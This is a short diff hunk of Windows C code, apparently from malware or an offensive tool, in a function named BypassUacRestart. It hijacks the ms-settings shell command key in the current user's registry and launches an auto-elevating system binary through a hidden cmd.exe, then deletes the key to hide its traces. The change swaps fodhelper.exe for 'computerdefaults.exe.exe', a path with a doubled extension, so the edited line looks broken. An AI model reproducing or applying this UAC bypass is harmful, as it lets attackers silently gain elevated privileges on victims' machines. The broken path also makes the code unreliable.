@@ -69,7 +69,7 @@ BOOL BypassUacRestart(void) {
     RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);
     RegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
     RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
-    CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\computerdefaults.exe.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     Sleep(1000);
     RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
     return TRUE;
